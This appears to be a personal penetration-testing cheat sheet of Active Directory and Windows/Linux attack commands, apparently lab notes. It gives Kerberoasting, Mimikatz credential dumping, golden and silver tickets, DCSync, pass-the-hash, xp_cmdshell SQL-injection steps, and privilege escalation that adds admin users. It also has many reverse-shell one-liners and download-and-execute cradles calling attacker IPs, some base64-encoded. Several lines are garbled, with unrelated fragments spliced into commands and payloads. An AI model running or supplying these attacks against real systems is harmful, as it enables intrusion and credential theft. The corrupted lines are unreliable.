Get-NetSession -ComputerName files04 -Verbose   \\Adding verbosity to our Get-NetSession command to view any error
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl  \\Running Get-NetSession on CLIENT74, change hostname accordingly
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion   \\Displaying permissions on the DefaultSecurity registry hive
net group "Management Department" stephanie /add /domain  \\ add user stephanie to group Management Department, we can do this only if we a permissions
net group "Management Department" stephanie /add /domain  \\ delete the added user from tghe gfroup, need permissions to do so
net user robert * /Domain   \\command to change the password for user, but need permissions, change username accordingly

Enum though PsLoggedon:
PsLoggedOn will enumerate the registry keys under HKEY_USERS to retrieve the security identifiers (SID)
.\PsLoggedon.exe \\client74     \\\Using PsLoggedOn to see user logons at client74

Enum Through SPN (Service Principal Names):
setspn -L iis_service   \\Listing SPN linked to a certain user account
Get-NetUser -SPN | select samaccountname,serviceprincipalname   \\Listing the SPN accounts in the domain, use this under Import-Module/PowerView.ps1
nslookup.exe web04.corp.com  \\Resolving the web04.corp.com name using nslookup

Enumerating Object Permissions:
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group

Commands enum Object Permission:
Get-ObjectAcl -Identity stephanie  \\enumerated every ACE that grants or denies some sort of permission to stephanie
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"}   \\This command finds Active Directory permissions set to "GenericAll"
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104   \\Converting the ObjectISD into name
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights   \\Enumerating ACLs for the Management Group which Active Directory Rights set to Geniric All
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName   \\ Converting multiple SIDs to Name
runas /user:robert@corp.com cmd.exe   \\command to run as other user, we can use this command for example, if we know or changed another user password in the domain
net user robert * /Domain   \\command to change the password for user, but need permissions, change username accordingly

Enumerating Domain Shares:
Find-DomainShare  \\Domain Share Query
ls \\dc1.corp.com\sysvol\corp.com\  \\Listing contents of the SYSVOL share
ls \\FILES04\docshare    \\Listing the contents of docsare
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml   \\Checking contents of old-policy-backup.xml file, change the path to file accordingle to read the content
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"   \\Using gpp-decrypt to decrypt the password that used aes 256 to encrypt

Collecting Data with SharpHound:
Import-Module .\Sharphound.ps1   \\ Importing the SharpHound script to memory
Get-Help Invoke-BloodHound  \\ Checking the SharpHound options
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"  \\Running SharpHound to collect domain data

Analysing Data using BloodHound: Run this in Kali
sudo neo4j start  \\Starting the Neo4j service in Kali Linux unmae/pass: neo4j/neo4j@2000
http://localhost:7474   \\export PATH=/tmp:$PATHbrowesto the address, use neo4j as both username and password, change new password after or keep the same
bloodhound  \\then start bloodhound and enter the ne04j creds and start analyzing the data that we collected using sharphound earlier, tranfert the report from windows to out jkali to analyze.  
can anlayze using raw query:
MATCH (m:Computer) RETURN m
MATCH (m:user) RETURN m

Get SPN hash:
./spn.ps1   \\use Get-SPN.ps1 script
Now will know whos is the spn, and will choose which spn's ticket to load
Load SPN's ticket using below command:
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'   \\change the spn name aCCORDINGLY, It is enclosed with single qoutes

Now have to use another powershell script to obtain hash of SPN
Download the Invoke-Kerberoast.ps1
iex(new-object net.webclient).downloadString('http://192.168.45.240:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat  \\use thios cript in powershell env to obatin SPN hash from ,already loaded SPN ticket

Now it might not be in correct format, so tansfer it to sublime text editer and remove all white spaces and all new line, 
you can do it by goto find -> replace, Now at the bottom left click "*" and enter a space in field to remove all white spaces
and to remove all new line , follow same but inted just enter space in field now ente "\n" to remove all new lines.

Then crack using hashcat or john:
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 kerb.hash 
hashcat -m 13100 --force -a 0 kerb.hash /usr/share/wordlists/rockyou.txt

Now to change user check with winrm, mssql, smb, nothing works then use the steps below:
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1  \\get invoke-runas
tranfer to target machine
import-module ./Invoke-RunasCs.ps1   \\import module
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"  \\change username, password accordingly
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240/powercat.ps1');powercat -c 192.168.45.240 -p 5555 -e cmd"  \\use powercat to get shell

Using mimikatz: To get NTLM hashes and (TGT, TGS)
./mimkatz.exe  \\execute mimikatze
privilege::debug   \\run this in mimikatze to engage the SeDebugPrivlege8 privilege, which will allow us to interact with a process owned by another account
sekurlsa::logonpasswords   \\ Executing this to get NTLM and SHA1 hashes
dir \\web04.corp.com\backup   \\ run this in powershell to create and cache a service ticket
sekurlsa::tickets   \\Extracting Kerberos tickets (TGT and TGS)

SAM & SYSTEM: look for this file in AD
download C:\windows.old\Windows\System32\SAM /home/kali/SAM  \\download from windows to kali, change path accordingly
download C:\windows.old\Windows\System32\SAM /home/kali/SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM local    \\\then run this in kali directory where the SAM and SYSTEm is

Password Attacks:///192.168.45.160/test/ 
net accounts //to obtain the account policy

Using Crackmapexe:
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success    //to attack user accounts with password and set of users in users.txt
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com  //command to check user as admin privilege in corp.com if yes will get "pwn3d"
crackmapexec smb -d CORP -u leon -p HomeTaping199! -x 'whoami' 192.168.203.73  \\also we can execute command using "-x" parameter

Using Kerbrute:
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"  //Using kerbrute to attack user accounts with password and set of users against corp.com

AS-REP Roasting: 
To check wheather any AD user doesn't have kerbrous preauth and steal their AS-REP hash 
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete  \\In kali, to perform AS-REP roasting, required username and password of an user in the domain
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force   \\hashcat to crack found AS_REP hash
.\Rubeus.exe asreproast /nowrap  \\using Rubeus to do the same but in windows
crack the found hash in the same way we did a step back.
Always it is good to try the below command when you don't have valid ad creds
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request  \\change htb.local according to you AD's DC's

Kerberoasting: To get TGS Req hash (SPN)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast  \\In Windiows using Rubeus
sudo hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force   \\then perfom hashcat to identify password from the hash we found
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete  \\In Kali usin imapcket-GetUserSPNsuse,
Then use hashcat to crack the password from the hash

Creating Silver Ticket:
we need to collect the following three pieces of information to create a silver ticket:
SPN password hash/ii_service account NTLM hash needed
Domain SID
Target SPN 

iwr -UseDefaultCredentials http://web04   \\Trying to access the web page on WEB04 as user jeff
if you cant access as a curerent user then use mimikatze:
privilege::debug
sekurlsa::logonpasswords
Look for SPN password hash, now we got SPN password hash
Then get Domain SID
whoami /user
Then Forging the service ticket with the user jeffadmin and injecting it into the current session by using below command: 
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin  \\run this in mimikatz, most imortantly S-1-5-21-1987370270-658905905-1781884369-1105, in the SID we used don't inclue the las part(RID:1105 in this case)
rc4 - NTLM hash of a SPN user
target: web04 in this case
SID: Domain SID, don't include last four digit in kerberos command, in this case it is 1150(RID)
klist  \\this command is use to check we have a sieesion built using silver tickets.
iwr -UseDefaultCredentials http://web04  \\confirm with this command that we use our silver ticket successfully to connect to web04
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"   \\use Invoke-BloodHound -CollectionMethod Allthis command to find the content in the web page, in this command i have searched for word "OS{"

Domain Controller Synchronization:
run powershell as admin and use mimikatz
lsadump::dcsync /user:corp\dave   \\to get NTLM hash
hash for Dc sync
using hash cat find password
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70   \\same in kali 
crack the hash using hashcat as above


Lateral Movement IN Active Directory:
USING WMIC:
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"  \\command to spwan a remote system using wmic, for this we need Local ADMIN credentials, in this case it is jen

Create a powerhell payload using below python code:
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

Then run the below code in powershell:xp_cmdshell:
Step 1:
make sure to enable xp_cmdshell by:

';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

or

';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--   \\enter in the vulnerable parameter to configure

Step 3: check with command:
';EXEC xp_cmdshell 'whoami'--

step 2: Upload payload
';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.XX.XX/nc64.exe c:/windows/temp/nc64.exe";--
Note:
run python3 -m http.server 80 to check the status of downloading progress, don't forget to run the command the directoryu where the nc64.exe file resides

step 3:
';EXEC xp_cmdshell "c:/windows/temp/nc64.exe 192.168.XX.XX 443 -e cmd.exe";--
#Creating the PSCredential object in PowerShell
$username = 'jen';  
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
#Creating a new CimSession
$options = New-CimSessionOption -Protocol DCOM  
$session = New-Cimsession -ComputerName 192.168.203.72 -Credential $credential -SessionOption $Options
#encoded powershell revershell payload, this came through the output of python script above
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};   \\Invoking the WMI session through PowerShell
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
\\Before executing the above powershell code, start nc listen in your kali on 443 or the port which you gave in revershell payload

Same Using WINRS:
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"  \
PS C:\users\public> powershell -Command "Start-Process powershell -Verb RunAs"
powershell -Command "Start-Process powershell -Verb RunAs"
PS C:\users\public> ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
True
PS C:\users\public> 
\command to retrive output of hostname and whoami command on host files04
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" 

\\Before executing the above powershell code, start nc listen in your kali on 443 or the port which you gave in revershell payload

Same Using WINRM: But we can connect to established session
Run the powershell script
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
Then,
New-PSSession -ComputerName 192.168.50.73 -Credential $credential \\command to list the established sesiions on the target host
Enter-PSSession 1  \\command to connect to the established session 1, change the session number accordingly

Same using PSEXEC:
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd  \\this command will get remote access as user jen in files04

Same USing Pass the Hash:
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73  \\Port 445 has to be opened in the target, we have to use NTLM hash of the Administrator in this case, we can chnege username and NTLM hash accordingly

OverPAss The Hash:
first launch the notepad or any o127.0.0.1:8000 ther tool as NTLM hash of the user you want
then run mimikatz and get NTLM hash of the user
privilege::debug
sekurlsa::logonpasswords  \\will show the NTLM hash
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell  \\run a powershell as diffrent user with NTLM hash of the user  
In the Powershell:
klist  \\to check do we have any TGT
if there is none , then
net use \\files04  \\Mapping a network share on a remote server, this will cache the TGT
then now use psexec to get remote access on files04
.\PsExec.exe \\files04 cmd 

Pass the Ticket: we casn get access to folders or share on a host that we dont have access using TGS ticket of authorized user
ls \\web04\backup  \\lets check wehtherGet-DomainUser | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_ -replace '^CN=(.*?),.*$', '$1' }
 we have a acess to the folder, in this caSE IT is webo4\backup, if not, thenInvoke-BloodHound -CollectionMethod All
Run mimikatze to export the tickets
privilege::debug
sekurlsa::tickets /export  \\this command will export the tickets
once done, now will list the exported ticket and look dor authorized users TGS ticket
dir *.kirbi  \\run this in powershell to list the TGS tickets
again in mimikatze run the below command 
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  \\here we have the TGS ticket of authorized user dave to web04, the ticket starts from [0;12bd0]
klist  \\ to check wether we have TGS ticket cached
ls \\web04\backup  \\Now we able to access the file because we have the authorized users TGS in our session

Using DCOM: Like PSEXEC
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.203.72"))  \\change your target host accordingly
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAPrintSpoofer.exeAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")

\\Simultaniouly listen using nc in kali to catch the reverse shell

Golden Ticket: Will give access to domain controller and inculde the local admin user to all powerfull groups like domain admins
PsExec64.exe \\DC1 cmd.exe   \\coomamnd to chech we have access to domain controller using psexec, jeffadmin passwordL:BrouhahaTungPerorateBroom2023!
then run mimikatz in domain controller to extrach NTLM hash of KRBTGT
privilege::debug
lsadump::lsa /patch   \\to list NTLM hash of all accounts, copt NTLM hash, SID of KRBTGT
then move local host in this case client 74, then 
run mimikatz
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt  \\use those SID and NTLM hash copied from DC
misc::cmd  \\use PsExec_ to launch a new command prompt with misc::cmd
PsExec.exe \\dc1 cmd.exe  \\dont use dc1's ip address, you will get blocked, just use hostname dc1

Shadow Copies: Lateral movement, to copy entide c: drive or a folder with dc access
vshadow.exe -nw -p  C:  \\Performing a Shadow Copy of the entire C: drive, note the "Shadow copy device name"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak   \\Copying the ntds database to the C: drive, here we are using Shadow copy device name" to do so
reg.exe save hklm\system c:\system.bak  \\to correctly extract the content
Then transfer the system.bak file to our kali machine
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  \\extract the conent using impacket-secretsdump in Kali

certipy: For ADCS enumeratrion
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable

ligolo:
$ sudo ip tuntap add user root mode tun ligolo
$ sudo ip link set ligolo up
./lin-proxy -selfcert -laddr 0.0.0.0:443   \\on kali machine (proxy machine)
./agent.exe -connect 10.10.14.3:443 -ignore-cert
$ sudo ip route add 172.16.170.0/24 dev ligolo   \\route in our kali machine
then enter "start" in lin proxy shell to start tunnel
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp  \\command to add listener in proxy
sudo ip route add 240.0.0.1/32 dev ligolo   \\For loopback

PrintSpoofer:
./PrintSpoofer.exe -i -c powershell

SSH:
/home/username/.ssh/id_ecdsa  \\path to get ssh keys, change to id_rsa, if id_ecdsa dosn't work
sshpass -p password ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no offsec@192.168.170.122 \\if normal ssh refuse the connection
chmod 600 id_rsa  \\change aofihspermissions for id_rsa private key

Fully Interactive shell:
/bin/bash -ip
python3 -c 'import pty; pty.spawn("/bin/bash")'  \\change python versions accordingly
stty raw -echo ; fg
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash";'bash -c 'bash -i >& /dev/tcp/192.168.45.240/4444 0>&1'

lua -e "os.execute('/bin/bash')"
busybox sh

Impacket:
impacket-psexec -dc-ip 172.168.170.10 leon@172.16.170.13  \\can logon from current iuser to another internal machine
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212   \\get access using NTLM hash
impacket-mssqlclient -windows-auth sql_svc:Dolphin1@10.10.179.148   \\to get mssql shel, change username, pass and ip accordingly

Check local running ports:
ss -tulpn

port forwarding: loopback
ssh -N -L 8000:localhost:8000 -p 22 dev@192.168.236.150  \\look back to our kali from remote host local ports, change port number , ip, and user name accordingly
Loopback to our kali:
ssh -R *:60002:localhost:60002 root@192.168.45.243 -i id_rsa   \\this command have to entered in target machine to access a internal ports

Loopback using chesil
chisel server --socks5 --reverse -p 1234 \\this on our linux 
chiselx86_64.exe client 10.10.14.63:1234 R:9090:127.0.0.1:9090 \\this on target system, in this example we doing revrse portforword for port 9090

Using plink.exe from windows to linux loopbacks
plink.exe -l kali -pw kali 10.10.XX.XX -R 9090:127.0.0.1:910 -P 2222 \\in windows machine
enable ssh servise on port 2222 in our kali machine

Powershell one liner:
client = New-Object System.Net.Sockets.TCPClient("192.168.45.180",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  \\change LIp and LPort accordingly
powershell -a "-e base64encoded"
"powershell -nop -w hidden -e base64encoded"

smb share enumaration:
smbclient //192.168.232.248/transfer -N   \\change share name accordingly 
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b   \\get access to shares using NTLM hash

GodPotato:
./god.exe -cmd "cmd /c whoami"
to add user and  grant admin privillege:
.\god.exe -cmd "net user rosh lovu@3000 /add"   \\this will add user rosh
.\god.exe -cmd "net localgroup administrators rosh /add"  \\this garnt user rosh admin privillege by adding her to admin group
./god.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.250 443"
./god.exe -cmd "nc.exe 192.168.45.242 443 -e cmd.exe"

mimikatz:
run as administrator
privilege::debug
To grab passwords and NTLM hash
token::elevate
sekurlsa::logonpasswords
lsadump::lsa /patch
lsadump::secrets
lsadump::sam
lsadump::trust /patch

DOAS:
read doas.conf file
doas csh  \to make the user root

linux reverse shell one liner:
bash -c 'bash -i >& /dev/tcp/192.168.49.116/80 0>&1'
nc -e /bin/bash 192.168.45.226 4444
mkfifo /tmp/f; nc 192.168.45.243 1234 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
bash -i >& /dev/tcp/192.168.45.229/22 0>&1
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.233:4444
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.240:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-r "pcntl_exec('/bin/sh', ['-p']);"  \\if php has suid or root privilege, can use for privesc

Powershell Reverse Shell:
powershell -c iex(iwr -usebasicparsing http://10.10.14.6/rev.ps1)  \\it will download and execute te ps script

SNMP enum Windows:
sudo nmap -sU --open -p 161 192.168.243.145
snmpwalk -c public -v1 -t 10 192.168.243.145  \\Using snmpwalk to enumerate the entire MIB tree
snmpwalk -c public -v1 192.168.243.145 1.3.6.1.4.1.77.1.2.25  \\Using snmpwalk to enumerate Windows users
snmpwalk -c public -v1 192.168.243.145 1.3.6.1.2.1.25.4.2.1.2   \\Using snmpwalk to enumerate Windows processes
snmpwalk -c public -v1 192.168.243.145 1.3.6.1.2.1.25.6.3.1.2   \\Using snmpwalk to enumerate installed software
snmpwalk -c public -v1 192.168.243.145 1.3.6.1.2.1.6.13.1.3   \\Using snmpwalk to enumerate open TCP ports

SNMP Enum linux:
snmpwalk -v2c -c public 192.168.236.149 NET-SNssh -N -L 8000:localhost:8000 -p 2222 dev@192.168.236.150MP-EXTEND-MIB::nsExtendObjects  \\change ip, and look for version and change accordingly
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.1     # Enumerate system information
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.2     # Enumerate network interfaces
